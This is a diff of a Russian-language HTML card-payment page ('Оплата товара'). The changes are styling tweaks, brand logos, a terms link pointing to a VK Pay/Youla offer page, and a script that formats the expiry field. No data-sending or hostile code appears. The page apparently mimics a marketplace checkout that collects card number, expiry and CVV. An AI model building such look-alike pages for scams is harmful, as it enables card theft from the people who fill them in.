@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Оплата товара</title>
-<link rel="icon" href="https://rskrf.ru/upload/resize_cache/iblock/ca3/660_668_240cd750bba9870f18aada2478b24840a/fsjl53uncevnh36kp5ctsqg6bgpqi22s.png">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 * { box-sizing: border-box; }
 
@@ -18,7 +18,7 @@ html, body {
 }
 
 .header {
- height: 125px;
+ /* height: 125px; */
  background: #fff;
  border-bottom: 1px solid #dedede;
  display: flex;
@@ -30,8 +30,8 @@ html, body {
 .logo-icon {
  width: 61px;
  height: 61px;
- border-radius: 15px;
- background: #087cf0;
+ /* border-radius: 15px; */
+ background: #fff;
  color: #fff;
  display: flex;
  align-items: center;
@@ -127,7 +127,7 @@ main {
 
 .button {
  width: 100%;
- height: 96px;
+ height: 20px;
  margin-top: 40px;
  border: 0;
  border-radius: 6px;
@@ -176,13 +176,14 @@ main {
 
 /* @media (max-width: 600px) { */
  .header {
- height: 125px;
+ height: 100px;
  padding-left: 10%;
  }
 
  .logo-icon {
  width: 61px;
  height: 61px;
+ border-radius: 10px;
  }
 
  .logo-word { font-size: 46px; }
@@ -214,7 +215,12 @@ main {
  margin-top: -35px;
  }
 
- .brand-union { font-size: 10px; }
+ .brand-unio { 
+    font-size: 4px;
+    width: 35px;
+    height: 25px;
+    padding-top: 1px;
+}
 
 .brand-circles .brand-circles2 { 
     font-size: 28px;
@@ -225,8 +231,8 @@ main {
 }
 
 .brand {
-    width: 45px;
-    height:35px;
+    width: 35px;
+    height:25px;
 }
 
  .columns {
@@ -300,6 +306,7 @@ input:focus {
         padding-left: 8px;
         font-size: 13px;
         border-radius: 5px;
+        margin-bottom:-10px;
     }
     .brand-row {
         margin-bottom: 1px;
@@ -308,6 +315,7 @@ input:focus {
         width: 30px;
         height: 30px;
         background-color: #fff;
+        border-radius:1px;
     }
     .logo-word {
         font-size: 25px;
@@ -319,7 +327,11 @@ input:focus {
         padding: 0 10px;
     }
     .button {
-        border-color: black;
+        height: 50px;
+        font-size: 16px;
+    }
+    .brand-visa, .brand-mir {
+        font-size: 17px;
     }
 }
 /* } */
@@ -337,28 +349,28 @@ input:focus {
  <div class="label">Номер карты</div>
 
  <div class="brand-row" aria-hidden="true">
- <span class="brand-union">UnionPay<br>漢字</span>
+ <img src="https://www.seekpng.com/png/detail/87-870800_although-opening-a-china-bank-account-with-bank.png" class="brand-unio">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1920px-Mastercard-logo.svg.png" class="brand">
  <!-- <div class="znak">
  <span class="brand-circles">.</span>
  <span class="brand-circles2">.</span>
  </div> -->
  <span class="brand-visa">VISA</span>
- <span>МИР</span>
+ <span class="brand-mir">МИР</span>
  </div>
 
-<input type="number" placeholder="От 16 до 19 цифр">
+<input type="text" placeholder="От 16 до 19 цифр" maxlength="19">
  <!-- <div class="field">От 16 до 19 цифр</div> -->
 
  <div class="columns">
  <section>
  <div class="label">Срок действия</div>
- <input type="text" placeholder="ММ/ГГ">
+ <input type="text" id="identifier" placeholder="ММ/ГГ">
  <!-- <div class="field">ММ/ГГ</div> -->
  </section>
  <section>
  <div class="label">CV код</div>
- <input type="text" placeholder="***">
+ <input type="text" placeholder="***" maxlength="3">
  <!-- <div class="field">***</div> -->
  </section>
  </div>
@@ -369,7 +381,7 @@ input:focus {
 
  <div class="terms">
  Нажимая на кнопку вы подтверждаете<br class="grine">
-<a class="grine">условия соглашения.</a>
+<a class="grine" href="https://rnko.vkpay.ru/oferta/youla_service">условия соглашения.</a>
  </div>
 
  <div class="secure">
@@ -379,5 +391,18 @@ input:focus {
  </a>Защищенное соединение
  </div>
 </main>
+<script>
+    const input = document.getElementById("identifier");
+
+    input.addEventListener("input", function() {
+        let value = input.value.replace(/\D/g, "").slice(0, 4);
+
+        if (value.length > 2) {
+            value = value.slice(0, 2) + "/" + value.slice(2, 4);
+        }
+
+        input.value = value;
+    });
+</script>
 </body>
 </html>
